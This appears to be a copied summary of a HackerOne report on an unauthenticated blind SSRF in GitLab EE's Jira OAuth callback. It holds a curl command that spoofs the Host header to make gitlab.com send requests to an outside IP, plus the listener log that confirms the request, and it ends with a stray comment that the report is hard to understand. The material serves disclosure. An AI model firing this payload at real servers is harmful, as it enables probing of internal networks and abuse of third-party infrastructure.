### Unauthenticated blind SSRF in OAuth Jira authorization controller
https://hackerone.com/reports/398799  

### Steps to reproduce the issue
1. spin up a GitLab EE instance with the latest version (11.2.1-ee
2. send a POST request to the /-/jira/login/oauth/callback endpoint, as shown below. In the request, point the Host header to the hostname / IP address and port number you want to send the request to
  ```curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'```
3. Observe a POST request being sent to 162.243.147.21:81 (in this case HTTPS):  

```
Listening on [0.0.0.0] (family 0, port 81)
Connection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)
��ؒ����
��/$����4�i�,�֟J%>�+�/�,�0�����#�'�	��$�(�
�gk39@j28��<=/5�l162.243.147.21

 Connection closed, listening again.
```  

Unable to understand the report properly
